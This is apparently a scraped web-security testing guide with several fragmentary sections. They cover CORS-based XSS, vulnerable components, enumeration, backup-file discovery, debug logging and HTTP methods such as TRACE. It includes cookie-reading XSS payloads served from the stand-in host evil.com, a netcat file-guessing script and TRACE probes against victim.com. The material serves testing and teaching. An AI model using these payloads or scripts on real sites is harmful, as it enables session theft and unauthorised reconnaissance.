      <div>
          <div>
              <pre><code>alert(document.cookie)
      </code></pre>
          </div>
      </div>
      <p>This would cause the alert to pop up on the victim&rsquo;s browser.</p>
      <p>A more damaging scenario involves the possibility of controlling the URL called in a CORS request. Since CORS allows the target resource to be accessible by the requesting domain through a header-based approach, the attacker may ask the target page to load malicious content from its own website.</p>
      <p>Here is an example of a vulnerable page:</p>
      <div>
          <div>
              <pre><code>&lt;b id=&quot;p&quot;&gt;&lt;/b&gt;
      &lt;script&gt;
          function createCORSRequest(method, url) {
              var xhr = new XMLHttpRequest();
              xhr.open(method, url, true);
              xhr.onreadystatechange = function () {
                  if (this.status == 200 &amp;&amp; this.readyState == 4) {
                      document.getElementById(&apos;p&apos;).innerHTML = this.responseText;
                  }
              };
              return xhr;
          }

          var xhr = createCORSRequest(&apos;GET&apos;, location.hash.slice(1));
          xhr.send(null);
      &lt;/script&gt;
      </code></pre>
          </div>
      </div>
      <p>The <code>location.hash</code> is controlled by user input and is used for requesting an external resource, which will then be reflected through the construct <code>innerHTML</code>. An attacker could ask a victim to visit the following URL:</p>
      <p><code>www.victim.com/#http://evil.com/html.html</code></p>
      <p>With the payload handler for <code>html.html</code>:</p>
      <div>
          <div>
              <pre><code>&lt;?php
      header(&apos;Access-Control-Allow-Origin: http://www.victim.com&apos;);
      ?&gt;
      &lt;script&gt;alert(document.cookie);&lt;/script&gt;
      </code></pre>

    <h4>It was #2 from the Top 10 community survey but also had enough data to make theTop 10 via data. Vulnerable Components are a known issue that westruggle to test and assess risk and is the only category to not haveany Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploits/impactweight of 5.0 is used. Notable CWEs included are <em>CWE-1104: Use ofUnmaintained Third-Party Components</em> and the two CWEs from Top 10 2013and 2017.</h4>
    </br>
    <h2>Description</h2>
    <p>You are likely vulnerable:</p>
    <ul>
        <li>
            <p>If you do not know the versions of all components you use (both &nbsp; &nbsp;client-side and server-side). This includes components you directly &nbsp; &nbsp;use as well as nested dependencies.</p>
        </li>
        <li>
            <p>If the software is vulnerable, unsupported, or out of date. This &nbsp; &nbsp;includes the OS, web/application server, database management system &nbsp; &nbsp;(DBMS), applications, APIs and all components, runtime environments, &nbsp; &nbsp;and libraries.</p>
        </li>
        <li>
            <p>If you do not scan for vulnerabilities regularly and subscribe to &nbsp; &nbsp;security bulletins related to the components you use.</p>
        </li>
        <li>
            <p>If you do not fix or upgrade the underlying platform, frameworks, &nbsp; &nbsp;and dependencies in a risk-based, timely fashion. This commonly &nbsp; &nbsp;happens in environments when patching is a monthly or quarterly task &nbsp; &nbsp;under change control, leaving organizations open to days or months &nbsp; &nbsp;of unnecessary exposure to fixed vulnerabilities.</p>
        </li>
        <li>
            <p>If software developers do not test the compatibility of updated, &nbsp; &nbsp;upgraded, or patched libraries.</p>
        </li>
        <li>
            <p>If you do not secure the components&rsquo; configurations (see &nbsp; &nbsp;<a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">A05:2021-Security Misconfiguration</a>).</p>
        </li>
    </ul>
    <h2>How to Prevent</h2>
    <p>There should be a patch management process in place to:</p>
    <ul>
        <li>
            <p>Remove unused dependencies, unnecessary features, components, files, &nbsp; &nbsp;and documentation.</p>
        </li>
        <li>
            <p>Continuously inventory the versions of both client-side and &nbsp; &nbsp;server-side components (e.g., frameworks, libraries) and their &nbsp; &nbsp;dependencies using tools like versions, OWASP Dependency Check, &nbsp; &nbsp;retire.js, etc. Continuously monitor sources like Common Vulnerability and &nbsp; &nbsp;Exposures (CVE) and National Vulnerability Database (NVD) for &nbsp; &nbsp;vulnerabilities in the components. Use software composition analysis &nbsp; &nbsp;tools to automate the process. Subscribe to email alerts for &nbsp; &nbsp;security vulnerabilities related to components you use.</p>
        </li>
        <li>
            <p>Only obtain components from official sources over secure links. &nbsp; &nbsp;Prefer signed packages to reduce the chance of including a modified, &nbsp; &nbsp;malicious component (See A08:2021-Software and Data Integrity &nbsp; &nbsp;Failures).</p>
        </li>
        <li>
            <p>Monitor for libraries and components that are unmaintained or do not &nbsp; &nbsp;create security patches for older versions. If patching is not &nbsp; &nbsp;possible, consider deploying a virtual patch to monitor, detect, or &nbsp; &nbsp;protect against the discovered issue.</p>
        </li>
    </ul>
    <p>Every organization must ensure an ongoing plan for monitoring, triaging,and applying updates or configuration changes for the lifetime of theapplication or portfolio.</p>
    <h2>Example Attack Scenarios</h2>
    <p><strong>Scenario #1:</strong> Components typically run with the same privileges asthe application itself, so flaws in any component can result in seriousimpact. Such flaws can be accidental (e.g., coding error) or intentional(e.g., a backdoor in a component). Some example exploitable componentvulnerabilities discovered are:</p>
    <ul>
        <li>
            <p>CVE-2017-5638, a Struts 2 remote code execution vulnerability that &nbsp; &nbsp;enables the execution of arbitrary code on the server, has been &nbsp; &nbsp;blamed for significant breaches.</p>
        </li>
        <li>
            <p>While the internet of things (IoT) is frequently difficult or &nbsp; &nbsp;impossible to patch, the importance of patching them can be great &nbsp; &nbsp;(e.g., biomedical devices).</p>
        </li>
    </ul>
    <p>There are automated tools to help attackers find unpatched ormisconfigured systems. For example, the Shodan IoT search engine canhelp you find devices that still suffer from Heartbleed vulnerabilitypatched in April 2014.</p>

        <li><strong>Databases:</strong> MySQL, PostgreSQL, MongoDB.</li>
        <li><strong>Frameworks:</strong> Django, Laravel, Flask, Ruby on Rails.</li>
        <li><strong>Custom Applications:</strong> Proprietary or in-house developed software.</li>
    </ul>

    <h2>Best Practices for Application Enumeration</h2>
    <p>Application enumeration must be performed responsibly. Here are some best practices:</p>
    <ul>
        <li>Only enumerate applications on servers you have explicit permission to analyze.</li>
        <li>Use non-intrusive methods first to minimize the risk of service disruption.</li>
        <li>Document findings clearly to help in security assessments and audits.</li>
        <li>Leverage automated tools for efficiency but verify results manually to ensure accuracy.</li>
    </ul>

    <h2>Example Enumeration Process</h2>
    <p>Suppose you are analyzing a web server hosting a corporate website:</p>
    <ol>
        <li>Run an Nmap scan to identify open ports (e.g., 80, 443, 8080).</li>
        <li>Use Wappalyzer to detect technologies like WordPress and Apache.</li>
        <li>Crawl the site with GoSpider to find subdomains and linked directories.</li>
        <li>Use Gobuster to find hidden paths, such as admin panels or APIs.</li>
        <li>Run WPScan to enumerate WordPress plugins and themes for vulnerabilities.</li>
    </ol>

	      <sl-details summary="Third Party Content" open>
			  <h4>Third-party content refers to any external content integrated into a website or application that is not created or controlled by the owner of the platform. It includes scripts, plugins, APIs, advertisements, and other resources hosted by external providers.</h4>

    <h2>Examples of Third-Party Content</h2>
    <ul>
        <li><strong>CDN-Hosted Libraries:</strong> JavaScript libraries like jQuery, React, or Bootstrap hosted on content delivery networks (CDNs).</li>
        <li><strong>Analytics Tools:</strong> Tools like Google Analytics or Matomo used for tracking and analytics.</li>
        <li><strong>Social Media Integrations:</strong> Widgets or plugins from platforms like Facebook, Twitter, or LinkedIn.</li>
        <li><strong>Payment Gateways:</strong> Services like PayPal, Stripe, or Razorpay embedded into e-commerce platforms.</li>
        <li><strong>Advertising Networks:</strong> Ads served by networks like Google AdSense or Media.net.</li>
        <li><strong>APIs:</strong> External APIs integrated into applications for additional functionality, such as weather, maps, or data processing.</li>
    </ul>

    <h2>Benefits of Third-Party Content</h2>
    <ul>
        <li><strong>Enhanced Functionality:</strong> Quickly add features without developing them in-house.</li>
        <li><strong>Reduced Development Time:</strong> Save time by leveraging pre-built solutions.</li>
        <li><strong>Scalability:</strong> Use services like CDNs to improve performance and scalability.</li>
        <li><strong>Analytics and Insights:</strong> Gain valuable insights into user behavior through analytics tools.</li>
    </ul>

    <h2>Risks Associated with Third-Party Content</h2>
    <ul>
        <li><strong>Security Vulnerabilities:</strong> External scripts or plugins might introduce vulnerabilities like Cross-Site Scripting (XSS) or data breaches.</li>
        <li><strong>Performance Issues:</strong> Third-party content can slow down website loading times if hosted on unreliable servers.</li>
        <li><strong>Privacy Concerns:</strong> Third-party trackers can collect user data, potentially violating privacy regulations like GDPR or CCPA.</li>
        <li><strong>Dependency Risks:</strong> Relying on external providers can create challenges if the service becomes unavailable or discontinued.</li>
        <li><strong>Compliance Issues:</strong> Using certain third-party content might not comply with industry or legal requirements.</li>
    </ul>

    <h2>Best Practices for Managing Third-Party Content</h2>
    <ol>
        <li><strong>Audit Third-Party Integrations:</strong> Regularly review all external content to ensure it is secure and necessary.</li>
        <li><strong>Implement Content Security Policies (CSP):</strong> Use CSP headers to control the sources of scripts and other content to prevent unauthorized execution.</li>
        <li><strong>Monitor Performance:</strong> Evaluate the impact of third-party content on website performance and loading times.</li>
        <li><strong>Minimize Dependencies:</strong> Use only essential third-party resources to reduce risks.</li>
        <li><strong>Use Trusted Providers:</strong> Integrate content from reputable providers with strong security practices.</li>
        <li><strong>Keep Integrations Updated:</strong> Ensure all third-party libraries and plugins are up-to-date to patch vulnerabilities.</li>
    </ol>

    <h2>Example: Risks of Malicious Third-Party Scripts</h2>
    <p>One of the common risks of third-party content is the inclusion of malicious scripts, which can be used to perform activities like:</p>
    <ul>
        <li>Stealing user data (e.g., form submissions).</li>
        <li>Injecting advertisements or redirecting users to malicious websites.</li>
        <li>Performing cryptojacking (using the user's system for mining cryptocurrency).</li>

    <!--debug parameters-->
    <sl-details summary="debug parameter" open>
      <h4>Testing for Debugging Code and Verbose Error Logging</h4>
   </br>
    <p>You can take the following static analysis approach for the logging statements:</p>
    <ol>
        <li>Import the application&apos;s code into Xcode.</li>
        <li>Search the code for the following printing functions: <code>NSLog</code>, <code>println</code>, <code>print</code>, <code>dump</code>, <code>debugPrint</code>.</li>
        <li>When you find one of them, determine whether the developers used a wrapping function around the logging function for better mark up of the statements to be logged; if so, add that function to your search.</li>
        <li>For every result of steps 2 and 3, determine whether macros or debug-state related guards have been set to turn the logging off in the release build. Please note the change in how Objective-C can use preprocessor macros:</li>
    </ol>
    <div>
        <pre><code>#ifdef DEBUG
        // Debug-only code
    #endif
    </code></pre>
    </div>
    <p>The procedure for enabling this behavior in Swift has changed: you need to either set environment variables in your scheme or set them as custom flags in the target&apos;s build settings. Please note that the following functions (which allow you to determine whether the app was built in the Swift 2.1. release-configuration) aren&apos;t recommended, as Xcode 8 and Swift 3 don&apos;t support these functions:</p>
    <ul>
        <li><code>_isDebugAssertConfiguration</code></li>
        <li><code>_isReleaseAssertConfiguration</code></li>
        <li><code>_isFastAssertConfiguration</code>.</li>
    </ul>
    <p>Depending on the application&apos;s setup, there may be more logging functions. For example, when <a href="https://github.com/CocoaLumberjack/CocoaLumberjack" title="CocoaLumberjack" target="_blank">CocoaLumberjack&nbsp;↗</a> is used, static analysis is a bit different.</p>
    <p>For the &quot;debug-management&quot; code (which is built-in): inspect the storyboards to see whether there are any flows and/or view-controllers that provide functionality different from the functionality the application should support. This functionality can be anything from debug views to printed error messages, from custom stub-response configurations to logs written to files on the application&apos;s file system or a remote server.</p>
    <p>As a developer, incorporating debug statements into your application&apos;s debug version should not be a problem as long as you make sure that the debug statements are never present in the application&apos;s release version.</p>
    <p>In Objective-C, developers can use preprocessor macros to filter out debug code:</p>
    <div>
        <pre><code>#ifdef DEBUG
        // Debug-only code
    #endif
    </code></pre>
    </div>
    <p>In Swift 2 (with Xcode 7), you have to set custom compiler flags for every target, and compiler flags have to start with &quot;-D&quot;. So you can use the following annotations when the debug flag <code>DMSTG-DEBUG</code> is set:</p>
    <div>
        <pre><code>#if MSTG-DEBUG
        // Debug-only code
    #endif
    </code></pre>
    </div>
    <p>In Swift 3 (with Xcode 8), you can set Active Compilation Conditions in Build settings/Swift compiler - Custom flags. Instead of a preprocessor, Swift 3 uses <a href="https://developer.apple.com/library/content/documentation/Swift/Conceptual/BuildingCocoaApps/InteractingWithCAPIs.html#//apple_ref/doc/uid/TP40014216-CH8-ID34" title="Swift conditional compilation blocks" target="_blank">conditional compilation blocks&nbsp;↗</a> based on the defined conditions:</p>
    <div>
        <pre><code>#if DEBUG_LOGGING
        // Debug-only code
    #endif
    </code></pre>
    </div>
    <h2>Dynamic Analysis</h2>
    <p>Dynamic analysis should be executed on both a simulator and a device because developers sometimes use target-based functions (instead of functions based on a release/debug-mode) to execute the debugging code.</p>
    <ol>
        <li>Run the application on a simulator and check for output in the console during the app&apos;s execution.</li>
        <li>Attach a device to your Mac, run the application on the device via Xcode, and check for output in the console during the app&apos;s execution.</li>
    </ol>
    <p>For the other &quot;manager-based&quot; debug code: click through the application on both a simulator and a device to see if you can find any functionality that allows an app&apos;s profiles to be pre-set, allows the actual server to be selected or allows responses from the API to be selected.</p>

        <h4>Steps to Find Admin URLs of a Website</h4>
        </br>

           <p>1. Check the website's source code</p>
           <p>Inspect the source code of the website's pages, especially the footer section, to look for any links or references to the admin URL.</p>

           <p>2. Check the website's robots.txt file</p>
           <p>Access the website's robots.txt file (if it exists) to look for any directives or comments that may reveal the admin URL.</p>

           <p>3. Check the website's sitemap.xml file</p>
           <p>Access the website's sitemap.xml file (if it exists) to look for any links or references to the admin URL.</p>

           <p>4. Perform a web application security scan</p>
           <p>Use a web application security scanner, such as OWASP ZAP or Burp Suite, to scan the website for known vulnerabilities and potential admin URLs.</p>

           <p>5. Perform a Google search</p>
           <p>Perform a Google search using various search operators and keywords to look for any publicly available information about the admin URL. For example, you can try searching for:</p>

    <h4>Most common scenarios include the presence of renamed old versions of modified files, inclusion files that are loaded into the language of choice and downloaded as source, and even automatic or manual backups in the form of compressed archives. Backup files can also be generated automatically by the underlying file system the application is hosted on, a feature usually referred to as &ldquo;snapshots&rdquo;.</h4>
    <h4>All these files may grant the tester access to inner workings, back doors, administrative interfaces, or even credentials to connect to the administrative interface or the database server.</p>
    </br>
    <p>An important source of vulnerability is found in files unrelated to the application. These files may be created when editing application files, creating on-the-fly backup copies, or leaving old or unreferenced files in the web tree. Performing in-place editing or other administrative actions on production web servers may inadvertently leave backup copies, either generated automatically by the editor while editing files, or by the administrator who is zipping a set of files to create a backup.</h4>
    <p>It is easy to forget such files and this may pose a serious security threat to the application. It happens because backup copies may be generated with file extensions differing from those of the original files. A <code>.tar</code>, <code>.zip</code> or <code>.gz</code> archive that we generate (and might forget) has obviously a different extension, and the same happens with automatic copies created by many editors (for example, emacs generates a backup copy named <code>file~</code> when editing <code>file</code>). Making a copy manually can produce a similar effect, such as when &lsquo;file&rsquo; is copied as &lsquo;file.old&rsquo;. The underlying file system the application is on could be making <code>snapshots</code> of your application at different points in time without your knowledge, which may also be accessible via the web, posing a similar but different <code>backup file</code> style threat to your application.</p>
    <p>As a result, these activities generate files that are not needed by the application and may be handled differently than the original file by the web server. For example, if we make a copy of login.asp and name it login.asp.old without proper security measures, it could potentially allow users to download the source code of login.asp. This is because <code>login.asp.old</code> will be typically served as text or plain, rather than being executed because of its extension. In other words, accessing <code>login.asp</code> causes the execution of the server-side code of <code>login.asp</code>, while accessing <code>login.asp.old</code> causes the content of <code>login.asp.old</code> (which is, again, server-side code) to be plainly returned to the user and displayed in the browser. This may pose security risks, since sensitive information may be revealed.</p>
    <p>Generally, exposing server-side code is a bad idea. Not only are you unnecessarily exposing business logic, but you may be unknowingly revealing application-related information which may help an attacker (path names, data structures, etc.). Not to mention the fact that there are too many scripts with embedded username and password in clear text (which is a careless and extremely dangerous practice).</p>
    <p>Other causes of unreferenced files are due to design or configuration choices when they allow diverse kind of application-related files such as data files, configuration files, log files, to be stored in file system directories that can be accessed by the web server. These files have normally no reason to be in a file system space that could be accessed via web, since they should be accessed only at the application level, by the application itself (and not by the casual user browsing around).</p>
    <h3>Threats</h3>
    <p>Old, backup and unreferenced files present various threats to the security of a web application:</p>
    <ul>
        <li>Unreferenced files may disclose sensitive information that can facilitate a focused attack against the application; for example, include files containing database credentials, configuration files containing references to other hidden content, absolute file paths, etc.</li>
        <li>Unreferenced pages may contain powerful functionality that can be used to attack the application; for example, an administration page that is not linked from published content but can be accessed by any user who knows where to find it.</li>
        <li>Old and backup files may contain vulnerabilities that have been fixed in more recent versions; for example, <code>viewdoc.old.jsp</code> may contain a directory traversal vulnerability that has been fixed in <code>viewdoc.jsp</code> but can still be exploited by anyone who finds the old version.</li>
        <li>Backup files may disclose the source code for pages designed to execute on the server; for example, requesting <code>viewdoc.bak</code> may return the source code for <code>viewdoc.jsp</code>, which can be reviewed for vulnerabilities that may be difficult to find by making blind requests to the executable page. While this threat applies to scripting languages such as Perl, PHP, ASP, shell scripts, JSP, etc., it is not limited to them, as shown in the example provided in the next point.</li>
        <li>Backup archives may contain copies of all files within (or even outside) the webroot. This allows an attacker to quickly enumerate the entire application, including unreferenced pages, source code, include files, etc. For example, if you forget a file named <code>myservlets.jar.old</code> containing a backup copy of your servlet implementation classes, you are exposing a lot of sensitive information which can be decompiled and reverse engineered.</li>
        <li>In some cases, copying or editing a file modifies the filename but leaves the file extension intact. This is common in Windows environments, where file copying operations generate filenames prefixed with &ldquo;Copy of &ldquo; or localized versions of this string. Since the file extension is left unchanged, this is not a case where an executable file is returned as plain text by the web server, and therefore not a case of source code disclosure. However, these files are dangerous too because there is a chance that they include obsolete and incorrect logic that, when invoked, could trigger application errors, which might yield valuable information to an attacker if diagnostic message display is enabled.</li>
        <li>Log files may contain sensitive information about the activities of application users, for example, sensitive data passed in URL parameters, session IDs, URLs visited (which may disclose additional unreferenced content), etc. Other log files (e.g. ftp logs) may contain sensitive information about the maintenance of the application by system administrators.</li>
        <li>File system snapshots may contain copies of the code that contain vulnerabilities that have been fixed in more recent versions. For example, <code>/.snapshot/monthly.1/view.php</code> may contain a directory traversal vulnerability that has been fixed in <code>/view.php</code> but can still be exploited by anyone who finds the old version.</li>

    <h2>Test Objectives</h2>
    <ul>
        <li>Find and analyse unreferenced files that might contain sensitive information.</li>
    </ul>
    <h2>How to Test</h2>
    <h3>Black-Box Testing</h3>
    <p>Testing for unreferenced files uses both automated and manual techniques, and typically involves a combination of the following:</p>
    <h4>Inference from the Naming Scheme Used for Published Content</h4>
    <p>Enumerate all of the application&rsquo;s pages and functionality. This can be done manually using a browser, or using an application spidering tool. Most applications use a recognizable naming scheme, and organize resources into pages and directories using words that describe their function. It is often possible to infer the name and location of unreferenced pages from the naming scheme used for published content. For example, if a page titled viewuser.asp is found, one should also look for edituser.asp, adduser.asp, and deleteuser.asp. Similarly, if a directory /app/user is discovered, one should also search for /app/admin and /app/manager.</p>
    <h4>Other Clues in Published Content</h4>
    <p>Many web applications leave clues in published content that can lead to the discovery of hidden pages and functionality. These clues can often be found in the source code of HTML and JavaScript files. The source code for all published content should be manually reviewed to identify clues about other pages and functionality. For example:</p>
    <p>Programmers&rsquo; comments and commented-out sections of source code may refer to hidden content:</p>
    <div>
        <div>
            <pre><code>&lt;!-- &lt;A HREF=&quot;uploadfile.jsp&quot;&gt;Upload a document to the server&lt;/A&gt; --&gt;
    &lt;!-- Link removed while bugs in uploadfile.jsp are fixed          --&gt;
    </code></pre>
        </div>
    </div>
    <p>JavaScript may contain page links that are only rendered within the user&rsquo;s GUI under certain circumstances:</p>
    <div>
        <div>
            <pre><code>var adminUser=false;
    if (adminUser) menu.add (new menuItem (&quot;Maintain users&quot;, &quot;/admin/useradmin.jsp&quot;));
    </code></pre>
        </div>
    </div>
    <p>HTML pages may contain FORMs that have been hidden by disabling the SUBMIT element:</p>
    <div>
        <div>
            <pre><code>&lt;form action=&quot;forgotPassword.jsp&quot; method=&quot;post&quot;&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;userID&quot; value=&quot;123&quot;&gt;
        &lt;!-- &lt;input type=&quot;submit&quot; value=&quot;Forgot Password&quot;&gt; --&gt;
    &lt;/form&gt;
    </code></pre>
        </div>
    </div>
    <p>Another source of clues about unreferenced directories is the <code>/robots.txt</code> file used to provide instructions to web robots:</p>
    <div>
        <div>
            <pre><code>User-agent: *
    Disallow: /Admin
    Disallow: /uploads
    Disallow: /backup
    Disallow: /~jbloggs
    Disallow: /include
    </code></pre>
        </div>
    </div>
    <h4>Blind Guessing</h4>
    <p>In its simplest form, this involves running a list of common filenames through a request engine in an attempt to guess files and directories that exist on the server. The following netcat wrapper script will read a wordlist from stdin and perform a basic guessing attack:</p>
    <div>
        <div>
            <pre><code>#!/bin/bash

    server=example.org
    port=80

    while read url
    do
    echo -ne &quot;$url\t&quot;
    echo -e &quot;GET /$url HTTP/1.0\nHost: $server\n&quot; | netcat $server $port | head -1
    done | tee outputfile
    </code></pre>
        </div>
    </div>
    <p>Depending upon the server, GET may be replaced with HEAD for faster results. The output file specified can be grepped for &ldquo;interesting&rdquo; response codes. The response code 200 (OK) usually indicates that a valid resource has been found (provided the server does not deliver a custom &ldquo;not found&rdquo; page using the 200 code). But also look out for 301 (Moved), 302 (Found), 401 (Unauthorized), 403 (Forbidden) and 500 (Internal error), which may also indicate resources or directories that are worthy of further investigation.</p>
    <p>The basic guessing attack should be run against the webroot, and also against all directories that have been identified through other enumeration techniques. More advanced/effective guessing attacks can be performed as follows:</p>
    <ul>
        <li>Identify the file extensions in use within known areas of the application (e.g. JSP, ASPX, HTML), and use a basic wordlist appended with each of these extensions (or use a longer list of common extensions if resources permit).</li>
        <li>&nbsp;</li>
        <li>For each file identified through other enumeration techniques, create a custom wordlist derived from that filename. Get a list of common file extensions (including ~, bak, txt, src, dev, old, inc, orig, copy, tmp, swp, etc.) and use each extension before, after, and instead of, the extension of the actual filename.</li>
    </ul>
    <p>Note: Windows file copying operations generate filenames prefixed with &ldquo;Copy of &ldquo; or localized versions of this phrase, hence they do not change file extensions. While &ldquo;Copy of &ldquo; files typically do not disclose source code when accessed, they might yield valuable information in case they cause errors when invoked.</p>
    <h4>Information Obtained Through Server Vulnerabilities and Misconfiguration</h4>
    <p>The most obvious way in which a misconfigured server may disclose unreferenced pages is through directory listing. Request all enumerated directories to identify any which provide a directory listing.</p>
    <p>Numerous vulnerabilities have been found in individual web servers which allow an attacker to enumerate unreferenced content, for example:</p>
    <ul>
        <li>Apache ?M=D directory listing vulnerability.</li>
        <li>&nbsp;</li>
        <li>Various IIS script source disclosure vulnerabilities.</li>
        <li>&nbsp;</li>
        <li>IIS WebDAV directory listing vulnerabilities.</li>
    </ul>
    <h4>Use of Publicly Available Information</h4>
    <p>Pages and functionality in internet-facing web applications that are not referenced from within the application itself may be referenced from other public domain sources. There are various sources of these references:</p>
    <ul>
        <li>Pages that used to be referenced may still appear in the archives of internet search engines. For example, <code>1998results.asp</code> may no longer be linked from a company&rsquo;s site, but may remain on the server and in search engine databases. This old script may contain vulnerabilities that could be used to compromise the entire site. The <code>site:</code> Google search operator may be used to run a query only against the domain of choice, such as in: <code>site:www.example.com</code>. Using search engines in this way has led to a broad array of techniques which you may find useful, and are described in the <code>Google Hacking</code> section of this Guide. Check it to hone your testing skills via Google. Backup files are not likely to be referenced by any other files and therefore may have not been indexed by Google, but if they lie in browsable directories the search engine might know about them.</li>
        <li>&nbsp;</li>
        <li>In addition, Google and Yahoo keep cached versions of pages found by their robots. Even if <code>1998results.asp</code> has been removed from the target server, a version of its output may still be stored by these search engines. The cached version may contain references to, or clues about, additional hidden content that still remains on the server.</li>
        <li>&nbsp;</li>
        <li>Content that is not referenced from within a target application may be linked to by third-party sites. For example, an application which processes online payments on behalf of third-party traders may contain a variety of bespoke functionality which can (normally) only be found by following links within the sites of its customers.</li>
    </ul>
    <h4>Filename Filter Bypass</h4>
    <p>Because deny list filters are based on regular expressions, one can sometimes take advantage of obscure OS filename expansion features which work in ways the developer didn&rsquo;t expect. The tester can sometimes exploit differences in ways that filenames are parsed by the application, web server, and underlying OS and it&rsquo;s filename conventions.</p>
    <p>Example: Windows 8.3 filename expansion <code>c:\\program files</code> becomes <code>C:\\PROGRA\~1</code></p>
    <ul>
        <li>Remove incompatible characters</li>
        <li>Convert spaces to underscores</li>
        <li>Take the first six characters of the basename</li>
        <li>Add <code>~&lt;digit&gt;</code> which is used to distinguish files with names using the same six initial characters</li>
        <li>This convention changes after the first 3 name collisions</li>
        <li>Truncate file extension to three characters</li>
        <li>Make all the characters uppercase</li>
    </ul>

      <h4>HTTP offers a number of methods that can be used to perform actions on the web server. Many of theses methods are designed to aid developers in deploying and testing HTTP applications. These HTTP methods can be used for nefarious purposes if the web server is misconfigured. Additionally, Cross Site Tracing (XST), a form of cross site scripting using the server&rsquo;s HTTP TRACE method, is examined. While GET and POST are by far the most common methods that are used to access information provided by a web server, the Hypertext Transfer Protocol (HTTP) allows several other (and somewhat less known) methods. RFC 2616 (which describes HTTP version 1.1 which is the standard today) defines the following eight methods:</h4>
      </br>
      <ul>
      <li>HEAD</li>
      <li>GET</li>
      <li>POST</li>
      <li>PUT</li>
      <li>DELETE</li>
      <li>TRACE</li>
      <li>OPTIONS</li>
      <li>CONNECT</li>
      </ul>
      <p>Some of these methods can potentially pose a security risk for a web application, as they allow an attacker to modify the files stored on the web server and, in some scenarios, steal the credentials of legitimate users. More specifically, the methods that should be disabled are the following:</p>
      <ul>
      <li>PUT: This method allows a client to upload new files on the web server. An attacker can exploit it by uploading malicious files (e.g.: an asp file that executes commands by invoking cmd.exe), or by simply using the victim&rsquo;s server as a file repository.</li>
      <li>DELETE: This method allows a client to delete a file on the web server. An attacker can exploit it as a very simple and direct way to deface a web site or to mount a DoS attack.</li>
      <li>CONNECT: This method could allow a client to use the web server as a proxy.</li>
      <li>TRACE: This method simply echoes back to the client whatever string has been sent to the server, and is used mainly for debugging purposes. This method, originally assumed harmless, can be used to mount an attack known as Cross Site Tracing, which has been discovered by Jeremiah Grossman (see links at the bottom of the page).</li>
      </ul>
      <p>If an application needs one or more of these methods, such as REST Web Services (which may require PUT or DELETE), it is important to check that their usage is properly limited to trusted users and safe conditions.</p>
      <h3 id="arbitrary-http-methods">Arbitrary HTTP Methods</h3>
      <p>Arshan Dabirsiaghi (see links) discovered that many web application frameworks allowed well chosen or arbitrary HTTP methods to bypass an environment level access control check:</p>
      <ul>
      <li>
      <p>Many frameworks and languages treat &ldquo;HEAD&rdquo; as a &ldquo;GET&rdquo; request, albeit one without any body in the response. If a security constraint was set on &ldquo;GET&rdquo; requests such that only &ldquo;authenticatedUsers&rdquo; could access GET requests for a particular servlet or resource, it would be bypassed for the &ldquo;HEAD&rdquo; version. This allowed unauthorized blind submission of any privileged GET request.</p>
      </li>
      <li>
      <p>Some frameworks allowed arbitrary HTTP methods such as &ldquo;JEFF&rdquo; or &ldquo;CATS&rdquo; to be used without limitation. These were treated as if a &ldquo;GET&rdquo; method was issued, and were found not to be subject to method role based access control checks on a number of languages and frameworks, again allowing unauthorized blind submission of privileged GET requests.</p>
      </li>
      </ul>
      <p>In many cases, code which explicitly checked for a &ldquo;GET&rdquo; or &ldquo;POST&rdquo; method would be safe.</p>
      <h2 id="how-to-test">How to Test</h2>
      <h3 id="discover-the-supported-methods">Discover the Supported Methods</h3>
      <p>To perform this test, the tester needs some way to figure out which HTTP methods are supported by the web server that is being examined. The OPTIONS HTTP method provides the tester with the most direct and effective way to do that. RFC 2616 states that, &ldquo;The OPTIONS method represents a request for information about the communication options available on the request/response chain identified by the Request-URI&rdquo;.</p>
      <p>The testing method is extremely straightforward and we only need to fire up netcat (or telnet):</p>
      <div class="language-bash highlighter-rouge">

      <p>Note: in order to understand the logic and the goals of this attack one must be familiar with <a href="https://owasp.org/www-community/attacks/xss/">Cross Site Scripting attacks</a>.</p>
      <p>The TRACE method, while apparently harmless, can be successfully leveraged in some scenarios to steal legitimate users&rsquo; credentials. This attack technique was discovered by Jeremiah Grossman in 2003, in an attempt to bypass the <a href="https://owasp.org/www-community/HttpOnly">HTTPOnly</a> tag that Microsoft introduced in Internet Explorer 6 SP1 to protect cookies from being accessed by JavaScript. As a matter of fact, one of the most recurring attack patterns in Cross Site Scripting is to access the document.cookie object and send it to a web server controlled by the attacker so that he or she can hijack the victim&rsquo;s session. Tagging a cookie as httpOnly forbids JavaScript from accessing it, protecting it from being sent to a third party. However, the TRACE method can be used to bypass this protection and access the cookie even in this scenario.</p>
      <p>As mentioned before, TRACE simply returns any string that is sent to the web server. In order to verify its presence (or to double-check the results of the OPTIONS request shown above), the tester can proceed as shown in the following example:</p>
      <div class="language-bash highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nv">$ </span>nc www.victim.com 80
      TRACE / HTTP/1.1
      Host: www.victim.com

      HTTP/1.1 200 OK
      Server: Microsoft-IIS/5.0
      Date: Tue, 31 Oct 2006 08:01:48 GMT
      Connection: close
      Content-Type: message/http
      Content-Length: 39

      TRACE / HTTP/1.1
      Host: www.victim.com
      </code></pre>
      </div>
      </div>
      <p>The response body is exactly a copy of our original request, meaning that the target allows this method. Now, where is the danger lurking? If the tester instructs a browser to issue a TRACE request to the web server, and this browser has a cookie for that domain, the cookie will be automatically included in the request headers, and will therefore be echoed back in the resulting response. At that point, the cookie string will be accessible by JavaScript and it will be finally possible to send it to a third party even when the cookie is tagged as httpOnly.</p>
      <p>There are multiple ways to make a browser issue a TRACE request, such as the XMLHTTP ActiveX control in Internet Explorer and XMLDOM in Mozilla and Netscape. However, for security reasons the browser is allowed to start a connection only to the domain where the hostile script resides. This is a mitigating factor, as the attacker needs to combine the TRACE method with another vulnerability in order to mount the attack.</p>
      <p>An attacker has two ways to successfully launch a Cross Site Tracing attack:</p>
      <ul>
      <li>Leveraging another server-side vulnerability: the attacker injects the hostile JavaScript snippet that contains the TRACE request in the vulnerable application, as in a normal Cross Site Scripting attack</li>
      <li>Leveraging a client-side vulnerability: the attacker creates a malicious website that contains the hostile JavaScript snippet and exploits some cross-domain vulnerability of the browser of the victim, in order to make the JavaScript code successfully perform a connection to the site that supports the TRACE method and that originated the cookie that the attacker is trying to steal.</li>
      </ul>
      <p>More detailed information, together with code samples, can be found in the original whitepaper written by Jeremiah Grossman.</p>

